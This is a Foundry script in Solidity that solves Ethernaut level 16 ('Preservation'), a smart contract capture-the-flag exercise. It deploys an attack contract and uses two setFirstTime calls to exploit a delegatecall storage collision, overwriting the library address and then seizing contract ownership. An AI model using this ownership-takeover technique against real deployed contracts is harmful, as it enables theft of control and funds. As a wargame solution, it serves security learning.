// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { Preservation } from "src/Level16.sol";
import { L16Attack } from "src/Level16Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Preservation instance = Preservation(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        L16Attack attack = new L16Attack();
        // change first library to point to attack contract
        instance.setFirstTime(uint256(uint160(address(attack))));
        // call attack contract to change third slot
        instance.setFirstTime(uint256(uint160(txOrigin)));
        require(instance.owner() == txOrigin);

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
